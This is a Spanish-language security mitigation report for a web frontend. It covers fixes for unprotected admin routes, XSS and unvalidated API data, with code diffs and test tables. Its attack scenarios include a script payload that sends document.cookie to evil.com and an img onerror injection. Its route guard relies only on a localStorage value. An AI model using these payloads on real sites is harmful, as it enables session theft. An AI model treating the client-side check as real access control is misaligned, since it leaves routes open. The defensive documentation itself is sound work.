# Reporte de Mitigación: Explotación de Software en Clientes (Parte 3)

**ID de Tarea:** Parte 3 - Explotación de Software en Clientes
**Naturalezas de Corrección:**
1. Saneamiento de Entradas (XSS) - Prevención de ejecución de scripts.
2. Manejo Seguro de Datos (Integridad) - Validación de respuestas del API.
3. Protección de rutas (Auth Guard) - Directorescape prevention.

---

## Descripción de las Vulnerabilidades

El cliente (Frontend) presentaba tres debilidades principales:

### B-01: Cliente como Objetivo de Ataque (CWE-425)
Las rutas administrativas (`/dashboard`, `/administradores`, etc.) **no tenían protección** en el cliente. Un atacante podía navegar directamente a estas rutas sin autenticación si conocía las URLs.

### B-02: Cross-Site Scripting (CWE-79)
Los formularios permitían el envío de cualquier cadena de texto sin sanitización, facilitando la inyección de scripts que podrían ejecutarse al ser renderizados.

### B-03: Manejo Inseguro de Datos del API
El cliente procesaba respuestas del servidor **sin validar su estructura**, lo que lo hacía vulnerable a ataques donde un atacante manipula la respuesta del API para causar fallos lógicos o inyecciones.

---

## Mitigaciones Aplicadas

### 1. Auth Guard en `layout.tsx` (B-01 - Naturaleza: Protección de Rutas)

```typescript
// ANTES (VULNERABLE):
export default function AdminLayout({ children }) {
  return <div>{children}</div>; // ❌ Sin validación
}

// DESPUÉS (CORREGIDO):
useEffect(() => {
  const userRole = localStorage.getItem("userRole");
  if (!userRole) {
    router.push("/auth");
  } else {
    setIsAuthorized(true);
  }
}, [router]);
```

### 2. Sanitización XSS con DOMPurify (B-02 - Naturaleza: Saneamiento)

```typescript
// En auth/page.tsx
// ANTES (VULNERABLE):
const dirtyMessage = `Error: ${data.message}`;
setMessage(dirtyMessage); // ❌ Puede contener scripts

// DESPUÉS (CORREGIDO):
const dirtyMessage = `Error: ${data.message}`;
const cleanMessage = DOMPurify.sanitize(dirtyMessage);
setMessage(cleanMessage); // ✅ Etiquetas peligrosas eliminadas
```

### 3. Validación de Integridad con Zod (B-03 - Naturaleza: Manejo Seguro de Datos)

```typescript
// En administradores/page.tsx
// ANTES (VULNERABLE):
const data = await res.json();
setMaquinas(data.data); // ❌ Sin validar estructura

// DESPUÉS (CORREGIDO):
const validatedData = z.array(adminMaquinaSchema).safeParse(data.data);
if (validatedData.success) {
  setMaquinas(validatedData.data);
}
```

---

## Archivos Modificados

| Archivo | Cambio |
|---------|--------|
| `frontend/app/(admin)/layout.tsx` | Agregado Auth Guard con useEffect |
| `frontend/app/auth/page.tsx` | Integración de DOMPurify.sanitize |
| `frontend/app/(admin)/administradores/page.tsx` | Validación Zod en fetch |
| `frontend/src/lib/security-schemas.ts` | Esquemas de sanitización y validación |
| `frontend/tests/client-security.test.tsx` | Suite de tests completa |

---

## Tests Automatizados

Se implementaron tests en `frontend/tests/client-security.test.tsx` que demuestran:

### Tests de Verificación Estática
| Test | Descripción | Estado |
|------|-------------|--------|
| layout.tsx SIN Auth Guard | Verifica ausencia del vulnerable pattern | PASADO |
| auth/page.tsx SIN DOMPurify | Verifica ausencia de sanitización | PASADO |
| administradores/page.tsx SIN validación | Verifica ausencia de Zod | PASADO |

### Tests de Integración
| Test | Descripción | Estado |
|------|-------------|--------|
| Sin rol → Redirect a /auth | Auth Guard expulsa usuarios no autenticados | PASADO |
| Con rol admin → Acceso permitido | Auth Guard permite usuarios autorizados | PASADO |
| DOMPurify elimina scripts | Sanitización funciona correctamente | PASADO |
| Zod safeParse transforma datos | Datos maliciosos son sanitizados | PASADO |

### Tests de Reversión Temporal
| Test | Descripción | Estado |
|------|-------------|--------|
| Sin Auth Guard → Acceso permitido | Demuestra vulnerabilidad original | PASADO |
| Con Auth Guard → Acceso bloqueado | Demuestra corrección efectiva | PASADO |

---

## Cómo Ejecutar las Pruebas

```bash
cd frontend
pnpm install
pnpm test -- client-security.test.tsx
```

**Salida esperada:**
```
✓ B-01: Protección de Rutas en Cliente (Auth Guard)
✓ B-02: Sanitización XSS (CWE-79)
✓ B-03: Integridad de Datos Recibidos
✓ Demostración de vulnerabilidad (reversión temporal)
  12 tests passing
```

---

## Escenarios de Ataque Previstos

### Escenario 1: Directorescape (B-01)
```
# Navegación directa a ruta protegida SIN autenticación:
GET /dashboard

# ANTES: 200 OK (contenido renderizado)
# DESPUÉS: Redirect a /auth (401 equivalente en cliente)
```

### Escenario 2: XSS en mensaje de error (B-02)
```
# Respuesta del servidor comprometida:
{
  "success": false,
  "message": "Error: <script>fetch('http://evil.com?c='+document.cookie)</script>"
}

# ANTES: El script se ejecuta en el navegador del cliente
# DESPUÉS: DOMPurify sanitiza y el script se elimina
```

### Escenario 3: Datos API manipulados (B-03)
```
# API comprometida envía:
{
  "success": true,
  "data": [{
    "id_maquina": 1,
    "tipo": "<img src=x onerror='alert(1)'>",
    "modelo": "{\"injection\": true}",
    ...
  }]
}

# ANTES: Datos renderizados directamente sin validación
# DESPUÉS: Zod sanitiza y transforma los datos
```

---

## Recomendaciones Post-Corrección

1. **Server-side validation**: No confiar ciegamente en la validación del cliente
2. **HTTPS only**: Asegurar que todas las comunicaciones usen HTTPS
3. **Content Security Policy**: Implementar CSP headers para mayor protección
4. **Rate limiting**: Implementar rate limiting para prevenir fuerza bruta

---

**Autor:** Josue Chaves
**Branch:** `fix/jc-client-security`
**Fecha:** 08/05/2026
**Tests:** `frontend/tests/client-security.test.tsx`